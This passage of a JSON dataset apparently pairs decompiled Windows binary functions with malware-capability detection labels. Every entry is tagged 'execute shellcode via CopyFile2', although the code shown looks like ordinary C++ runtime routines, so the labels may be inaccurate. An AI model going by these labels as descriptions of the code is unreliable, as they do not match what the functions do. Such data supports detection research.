        "decompiled_code": "\nulong fcn.140014b80(ulong *arg1)\n\n{\n    ulong *apuStackX8 [4];\n    \n    apuStackX8[0] = arg1;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0x22474343, 0, 1, apuStackX8);\n    (*apuStackX8[0][2])(1, 0x1a, *apuStackX8[0], apuStackX8[0], 0, apuStackX8[0][6]);\n    return 0x10;\n}\n",
        "token_count": 130
    },
    "1400b394": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400b3940(char **arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = \"@9\\v@\\x01\";\n    fcn.1400b2950(arg1, 0);\n    fcn.1400b29f0(arg1);\n    if (arg1[0x19] != arg1 + 8) {\n        if (arg1[0x19] != NULL) {\n            fcn.1400bc6b0();\n        }\n        arg1[0x19] = NULL;\n    }\n    arg1_00 = arg1[0x1a];\n    if (arg1_00 != *0x140108760) {\n        if (**0x14010fc90 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.1400a5480(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "140083e0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.140083e00(ulong *arg1, ulong noname_1, int64_t *arg3, uchar (*arg4) [16])\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uchar (*in_stack_00000028) [16];\n    uchar in_stack_00000030;\n    ulong in_stack_00000038;\n    int32_t *in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t *in_stack_00000050;\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    ulong uStack104;\n    uint64_t uStack96;\n    uchar uStack81;\n    int64_t iStack80;\n    \n    uVar1 = *(*arg4 + 8);\n    auStack120 = *arg4;\n    auStack136 = *in_stack_00000028;\n    if (in_stack_00000048 == 0) {\n        iStack80 = fcn.14007b890(0, 0);\n        (**(*arg3 + 0x18))(&uStack104, arg3, auStack120, auStack136, in_stack_00000030, in_stack_00000038);\n        piVar4 = *0x14010fc90;\n        if (*in_stack_00000040 == 0) {\n            if (in_stack_00000050[4] != NULL) {\n                (*in_stack_00000050[4])(in_stack_00000050);\n            }\n            piVar4 = *0x14010fc90;\n            if (*(iStack80 + -8) < 0) {\n                iVar3 = fcn.14007c020(iStack80 + -0x18, &uStack81, 0);\n                piVar4 = *0x14010fc90;\n            }\n            else {\n                iVar3 = iStack80;\n                if (**0x14010fc90 == 0) {\n                    *(iStack80 + -8) = *(iStack80 + -8) + 1;\n                }\n                else {\n                    LOCK();\n                    *(iStack80 + -8) = *(iStack80 + -8) + 1;\n                }\n            }\n            *in_stack_00000050 = iVar3;\n            in_stack_00000050[1] = *(iStack80 + -0x18);\n            in_stack_00000050[4] = 0x140086810;\n        }\n        iVar2 = *piVar4;\n        *arg1 = uStack104;\n        arg1[1] = uVar1 & 0xffffffff00000000 | uStack96 & 0xffffffff;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack80 + -8);\n            *(iStack80 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar4 = iStack80 + -8;\n            iVar2 = *piVar4;\n            *piVar4 = *piVar4 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.14007bf10(iStack80 + -0x18, &uStack81);\n        }\n    }\n    else {\n        auStack120 = auStack136;\n        uStack104 = **arg4;\n        uStack96 = uVar1;\n        (**(*arg3 + 0x10))(arg1, arg3, &uStack104, auStack120, in_stack_00000030);\n    }\n    return arg1;\n}\n",
        "token_count": 789
    },
    "14008404": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.140084040(ulong *arg1, ulong noname_1, int64_t *arg3, ulong *arg4)\n\n{\n    uint64_t uVar1;\n    ulong *in_stack_00000028;\n    uchar in_stack_00000030;\n    int32_t *in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t *in_stack_00000050;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    uint64_t uStack96;\n    ulong uStack88;\n    uint64_t uStack80;\n    uchar *puStack72;\n    int64_t iStack64;\n    uchar auStack56 [16];\n    \n    uStack104 = *arg4;\n    uVar1 = arg4[1];\n    uStack120 = *in_stack_00000028;\n    uStack112 = in_stack_00000028[1];\n    if (in_stack_00000048 == 0) {\n        iStack64 = 0;\n        auStack56[0] = 0;\n        uStack96 = uVar1;\n        puStack72 = auStack56;\n        (**(*arg3 + 0x18))(uStack120, &uStack88, arg3, &uStack104, &uStack120, in_stack_00000030);\n        if (*in_stack_00000040 == 0) {\n            if (in_stack_00000050[4] != NULL) {\n                (*in_stack_00000050[4])(in_stack_00000050);\n            }\n            *in_stack_00000050 = in_stack_00000050 + 2;\n            fcn.1400a7550(in_stack_00000050, puStack72, puStack72 + iStack64);\n            in_stack_00000050[4] = 0x140086870;\n        }\n        *arg1 = uStack88;\n        arg1[1] = uVar1 & 0xffffffff00000000 | uStack80 & 0xffffffff;\n        if (puStack72 != auStack56) {\n            fcn.1400bc6c0();\n        }\n    }\n    else {\n        uStack88 = uStack104;\n        uStack104 = uStack120;\n        uStack96 = uStack112;\n        uStack80 = uVar1;\n        (**(*arg3 + 0x10))(uStack120, arg1, arg3, &uStack88, &uStack104, in_stack_00000030);\n    }\n    return arg1;\n}\n",
        "token_count": 561
    },
    "14008420": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.140084200(ulong *arg1, ulong noname_1, int64_t *arg3, uchar (*arg4) [16])\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uchar (*in_stack_00000028) [16];\n    uchar in_stack_00000030;\n    ulong in_stack_00000038;\n    int32_t *in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t *in_stack_00000050;\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    ulong uStack104;\n    uint64_t uStack96;\n    uchar uStack81;\n    int64_t iStack80;\n    \n    uVar1 = *(*arg4 + 8);\n    auStack120 = *arg4;\n    auStack136 = *in_stack_00000028;\n    if (in_stack_00000048 == 0) {\n        iStack80 = fcn.1400723d0(0, 0);\n        (**(*arg3 + 0x18))(&uStack104, arg3, auStack120, auStack136, in_stack_00000030, in_stack_00000038);\n        piVar4 = *0x14010fc90;\n        if (*in_stack_00000040 == 0) {\n            if (in_stack_00000050[4] != NULL) {\n                (*in_stack_00000050[4])(in_stack_00000050);\n            }\n            piVar4 = *0x14010fc90;\n            if (*(iStack80 + -8) < 0) {\n                iVar3 = fcn.140072b30(iStack80 + -0x18, &uStack81, 0);\n                piVar4 = *0x14010fc90;\n            }\n            else {\n                iVar3 = iStack80;\n                if (**0x14010fc90 == 0) {\n                    *(iStack80 + -8) = *(iStack80 + -8) + 1;\n                }\n                else {\n                    LOCK();\n                    *(iStack80 + -8) = *(iStack80 + -8) + 1;\n                }\n            }\n            *in_stack_00000050 = iVar3;\n            in_stack_00000050[1] = *(iStack80 + -0x18);\n            in_stack_00000050[4] = 0x140086890;\n        }\n        iVar2 = *piVar4;\n        *arg1 = uStack104;\n        arg1[1] = uVar1 & 0xffffffffffff0000 | uStack96 & 0xffff;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack80 + -8);\n            *(iStack80 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar4 = iStack80 + -8;\n            iVar2 = *piVar4;\n            *piVar4 = *piVar4 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.140072a10(iStack80 + -0x18, &uStack81);\n        }\n    }\n    else {\n        auStack120 = auStack136;\n        uStack104 = **arg4;\n        uStack96 = uVar1;\n        (**(*arg3 + 0x10))(arg1, arg3, &uStack104, auStack120, in_stack_00000030);\n    }\n    return arg1;\n}\n",
        "token_count": 789
    },
    "14008444": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.140084440(ulong *arg1, ulong noname_1, int64_t *arg3, ulong *arg4)\n\n{\n    uint64_t uVar1;\n    ulong *in_stack_00000028;\n    uchar in_stack_00000030;\n    int32_t *in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t *in_stack_00000050;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    uint64_t uStack96;\n    ulong uStack88;\n    uint64_t uStack80;\n    ushort *puStack72;\n    int64_t iStack64;\n    ushort auStack56 [8];\n    \n    uStack104 = *arg4;\n    uVar1 = arg4[1];\n    uStack120 = *in_stack_00000028;\n    uStack112 = in_stack_00000028[1];\n    if (in_stack_00000048 == 0) {\n        iStack64 = 0;\n        auStack56[0] = 0;\n        uStack96 = uVar1;\n        puStack72 = auStack56;\n        (**(*arg3 + 0x18))(uStack120, &uStack88, arg3, &uStack104, &uStack120, in_stack_00000030);\n        if (*in_stack_00000040 == 0) {\n            if (in_stack_00000050[4] != NULL) {\n                (*in_stack_00000050[4])(in_stack_00000050);\n            }\n            *in_stack_00000050 = in_stack_00000050 + 2;\n            fcn.1400aaf70(in_stack_00000050, puStack72, puStack72 + iStack64);\n            in_stack_00000050[4] = 0x1400868f0;\n        }\n        *arg1 = uStack88;\n        arg1[1] = uVar1 & 0xffffffffffff0000 | uStack80 & 0xffff;\n        if (puStack72 != auStack56) {\n            fcn.1400bc6c0();\n        }\n    }\n    else {\n        uStack88 = uStack104;\n        uStack104 = uStack120;\n        uStack96 = uStack112;\n        uStack80 = uVar1;\n        (**(*arg3 + 0x10))(uStack120, arg1, arg3, &uStack88, &uStack104, in_stack_00000030);\n    }\n    return arg1;\n}\n",
        "token_count": 563
    },
    "14008691": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140086910(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar uStack57;\n    int64_t iStack56;\n    int64_t aiStack48 [2];\n    \n    iStack56 = fcn.14007b9e0(in_stack_00000038, in_stack_00000040 + in_stack_00000038);\n    (**(*arg2 + 0x18))(aiStack48, arg2, arg4, in_stack_00000028, in_stack_00000030, &iStack56);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    piVar4 = *0x14010fc90;\n    if (*(aiStack48[0] + -8) < 0) {\n        iVar3 = fcn.14007c020(aiStack48[0] + -0x18, &uStack57, 0);\n        piVar4 = *0x14010fc90;\n    }\n    else {\n        iVar3 = aiStack48[0];\n        if (**0x14010fc90 == 0) {\n            *(aiStack48[0] + -8) = *(aiStack48[0] + -8) + 1;\n        }\n        else {\n            LOCK();\n            *(aiStack48[0] + -8) = *(aiStack48[0] + -8) + 1;\n        }\n    }\n    iVar2 = *piVar4;\n    *arg3 = iVar3;\n    arg3[1] = *(aiStack48[0] + -0x18);\n    arg3[4] = 0x140086810;\n    if (iVar2 == 0) {\n        iVar2 = *(aiStack48[0] + -8);\n        *(aiStack48[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack48[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack48[0] + -0x18);\n    }\n    if (*piVar4 == 0) {\n        iVar2 = *(iStack56 + -8);\n        *(iStack56 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = iStack56 + -8;\n        iVar2 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.14007bf10(iStack56 + -0x18, aiStack48);\n    return;\n}\n",
        "token_count": 700
    },
    "140086ac": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140086ac0(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    ulong arg1;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar *apuStack104 [2];\n    uchar auStack88 [16];\n    uchar *puStack72;\n    int64_t iStack64;\n    uchar auStack56 [16];\n    \n    apuStack104[0] = auStack88;\n    if ((in_stack_00000038 == 0) && (in_stack_00000040 != 0)) {\n        arg1 = fcn.1400a9dd0();\n        if (puStack72 != auStack56) {\n            fcn.1400bc6c0();\n        }\n        do {\n            if (apuStack104[0] != auStack88) {\n                fcn.1400bc6c0();\n            }\n            arg1 = fcn.140014f30(arg1);\n        } while( true );\n    }\n    fcn.1400a7220(apuStack104, in_stack_00000038, in_stack_00000038 + in_stack_00000040);\n    (**(*arg2 + 0x18))(&puStack72, arg2, arg4, in_stack_00000028, in_stack_00000030, apuStack104);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    *arg3 = arg3 + 2;\n    fcn.1400a7550(arg3, puStack72, puStack72 + iStack64);\n    arg3[4] = 0x140086870;\n    if (puStack72 != auStack56) {\n        fcn.1400bc6c0();\n    }\n    if (apuStack104[0] != auStack88) {\n        fcn.1400bc6c0();\n    }\n    return;\n}\n",
        "token_count": 461
    },
    "140086be": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140086be0(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar uStack57;\n    int64_t iStack56;\n    int64_t aiStack48 [2];\n    \n    iStack56 = fcn.140072540(in_stack_00000038, in_stack_00000038 + in_stack_00000040 * 2);\n    (**(*arg2 + 0x18))(aiStack48, arg2, arg4, in_stack_00000028, in_stack_00000030, &iStack56);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    piVar4 = *0x14010fc90;\n    if (*(aiStack48[0] + -8) < 0) {\n        iVar3 = fcn.140072b30(aiStack48[0] + -0x18, &uStack57, 0);\n        piVar4 = *0x14010fc90;\n    }\n    else {\n        iVar3 = aiStack48[0];\n        if (**0x14010fc90 == 0) {\n            *(aiStack48[0] + -8) = *(aiStack48[0] + -8) + 1;\n        }\n        else {\n            LOCK();\n            *(aiStack48[0] + -8) = *(aiStack48[0] + -8) + 1;\n        }\n    }\n    iVar2 = *piVar4;\n    *arg3 = iVar3;\n    arg3[1] = *(aiStack48[0] + -0x18);\n    arg3[4] = 0x140086890;\n    if (iVar2 == 0) {\n        iVar2 = *(aiStack48[0] + -8);\n        *(aiStack48[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack48[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140072a10(aiStack48[0] + -0x18);\n    }\n    if (*piVar4 == 0) {\n        iVar2 = *(iStack56 + -8);\n        *(iStack56 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = iStack56 + -8;\n        iVar2 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.140072a10(iStack56 + -0x18, aiStack48);\n    return;\n}\n",
        "token_count": 701
    },
    "140086d9": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140086d90(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    ulong arg1;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    uchar *apuStack104 [2];\n    uchar auStack88 [16];\n    uchar *puStack72;\n    int64_t iStack64;\n    uchar auStack56 [16];\n    \n    apuStack104[0] = auStack88;\n    if ((in_stack_00000038 == 0) && (in_stack_00000040 != 0)) {\n        arg1 = fcn.1400a9dd0();\n        if (puStack72 != auStack56) {\n            fcn.1400bc6c0();\n        }\n        do {\n            if (apuStack104[0] != auStack88) {\n                fcn.1400bc6c0();\n            }\n            arg1 = fcn.140014f30(arg1);\n        } while( true );\n    }\n    fcn.1400aada0(apuStack104, in_stack_00000038, in_stack_00000038 + in_stack_00000040 * 2);\n    (**(*arg2 + 0x18))(&puStack72, arg2, arg4, in_stack_00000028, in_stack_00000030, apuStack104);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    *arg3 = arg3 + 2;\n    fcn.1400aaf70(arg3, puStack72, puStack72 + iStack64 * 2);\n    arg3[4] = 0x1400868f0;\n    if (puStack72 != auStack56) {\n        fcn.1400bc6c0();\n    }\n    if (apuStack104[0] != auStack88) {\n        fcn.1400bc6c0();\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "14008b23": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.14008b230(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    \n    *arg1 = *0x140110550 + 0x10;\n    arg1_00 = arg1 + 7;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg1[4] = 0;\n    arg1[5] = 0;\n    arg1[6] = 0;\n    fcn.1400a5a00(arg1_00);\n    *arg1 = 0x140117c90;\n    *(arg1 + 8) = 0;\n    arg1[9] = 0;\n    fcn.1400823c0(arg1 + 10);\n    arg1[0xe] = 0;\n    arg1[0xf] = 0x1000;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x13) = 0;\n    arg1[0x16] = 0;\n    *(arg1 + 0xc) = 0x0;\n    *(arg1 + 0x11) = 0x0;\n    *(arg1 + 0x14) = 0x0;\n    *(arg1 + 0x17) = 0x0;\n    cVar1 = fcn.1400b8810(arg1_00);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    iVar2 = fcn.1400b98b0(arg1_00);\n    arg1[0x14] = iVar2;\n    return;\n}\n",
        "token_count": 391
    },
    "14008b4f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.14008b4f0(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    \n    *arg1 = *0x140110550 + 0x10;\n    arg1_00 = arg1 + 7;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg1[4] = 0;\n    arg1[5] = 0;\n    arg1[6] = 0;\n    fcn.1400a5a00(arg1_00);\n    *arg1 = 0x140117c90;\n    *(arg1 + 8) = 0;\n    arg1[9] = 0;\n    fcn.1400823c0(arg1 + 10);\n    arg1[0xe] = 0;\n    arg1[0xf] = 0x1000;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x13) = 0;\n    arg1[0x16] = 0;\n    *(arg1 + 0xc) = 0x0;\n    *(arg1 + 0x11) = 0x0;\n    *(arg1 + 0x14) = 0x0;\n    *(arg1 + 0x17) = 0x0;\n    cVar1 = fcn.1400b8810(arg1_00);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    iVar2 = fcn.1400b98b0(arg1_00);\n    arg1[0x14] = iVar2;\n    return;\n}\n",
        "token_count": 393
    },
    "14008d8a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.14008d8a0(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    \n    *arg1 = *0x140110560 + 0x10;\n    arg1_00 = arg1 + 7;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg1[4] = 0;\n    arg1[5] = 0;\n    arg1[6] = 0;\n    fcn.1400a5a00(arg1_00);\n    *arg1 = 0x140117d10;\n    *(arg1 + 8) = 0;\n    arg1[9] = 0;\n    fcn.1400823c0(arg1 + 10);\n    arg1[0xe] = 0;\n    arg1[0xf] = 0x1000;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x82) = 0;\n    *(arg1 + 0x84) = 0;\n    *(arg1 + 0x13) = 0;\n    arg1[0x16] = 0;\n    *(arg1 + 0xc) = 0x0;\n    *(arg1 + 0x11) = 0x0;\n    *(arg1 + 0x14) = 0x0;\n    *(arg1 + 0x17) = 0x0;\n    cVar1 = fcn.1400b8870(arg1_00);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    iVar2 = fcn.1400b9910(arg1_00);\n    arg1[0x14] = iVar2;\n    return;\n}\n",
        "token_count": 420
    },
    "14008db7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.14008db70(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    \n    *arg1 = *0x140110560 + 0x10;\n    arg1_00 = arg1 + 7;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg1[4] = 0;\n    arg1[5] = 0;\n    arg1[6] = 0;\n    fcn.1400a5a00(arg1_00);\n    *arg1 = 0x140117d10;\n    *(arg1 + 8) = 0;\n    arg1[9] = 0;\n    fcn.1400823c0(arg1 + 10);\n    arg1[0xe] = 0;\n    arg1[0xf] = 0x1000;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x82) = 0;\n    *(arg1 + 0x84) = 0;\n    *(arg1 + 0x13) = 0;\n    arg1[0x16] = 0;\n    *(arg1 + 0xc) = 0x0;\n    *(arg1 + 0x11) = 0x0;\n    *(arg1 + 0x14) = 0x0;\n    *(arg1 + 0x17) = 0x0;\n    cVar1 = fcn.1400b8870(arg1_00);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    iVar2 = fcn.1400b9910(arg1_00);\n    arg1[0x14] = iVar2;\n    return;\n}\n",
        "token_count": 418
    },
    "1400b2aa": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400b2aa0(void)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    code *pcVar6;\n    int32_t *piVar7;\n    int64_t *piVar8;\n    int64_t *piVar9;\n    int64_t *piVar10;\n    uchar (*pauVar11) [16];\n    uchar (*pauVar12) [16];\n    uchar (*pauVar13) [16];\n    int64_t iVar14;\n    uchar auVar15 [16];\n    uchar auVar16 [16];\n    \n    pcVar6 = *0x140106580;\n    auVar15 = CONCAT88(*0x140110500 + 0x40, *0x140110500 + 0x18);\n    auVar16 = CONCAT88(*0x140110400 + 0x40, *0x140110400 + 0x18);\n    **0x140110180 = 1;\n    iVar14 = (*pcVar6)(1);\n    iVar2 = *0x140110550;\n    piVar10 = *0x14010fcf0;\n    piVar1 = *0x14010fcf0 + 7;\n    (*0x14010fcf0)[1] = 0;\n    iVar2 = iVar2 + 0x10;\n    piVar10[2] = 0;\n    *piVar10 = iVar2;\n    piVar10[3] = 0;\n    piVar10[4] = 0;\n    piVar10[5] = 0;\n    piVar10[6] = 0;\n    fcn.1400a5a00(piVar1);\n    iVar3 = *0x1401102f0;\n    piVar10[8] = iVar14;\n    *(piVar10 + 9) = 0xffffffff;\n    iVar3 = iVar3 + 0x10;\n    *piVar10 = iVar3;\n    iVar14 = (*pcVar6)(0);\n    piVar8 = *0x14010fcd0;\n    piVar1 = *0x14010fcd0 + 7;\n    **0x14010fcd0 = iVar2;\n    piVar8[1] = 0;\n    piVar8[2] = 0;\n    piVar8[3] = 0;\n    piVar8[4] = 0;\n    piVar8[5] = 0;\n    piVar8[6] = 0;\n    fcn.1400a5a00(piVar1);\n    *piVar8 = iVar3;\n    piVar8[8] = iVar14;\n    *(piVar8 + 9) = 0xffffffff;\n    iVar14 = (*pcVar6)(2);\n    piVar9 = *0x14010fce0;\n    piVar1 = *0x14010fce0 + 7;\n    **0x14010fce0 = iVar2;\n    piVar9[1] = 0;\n    piVar9[2] = 0;\n    piVar9[3] = 0;\n    piVar9[4] = 0;\n    piVar9[5] = 0;\n    piVar9[6] = 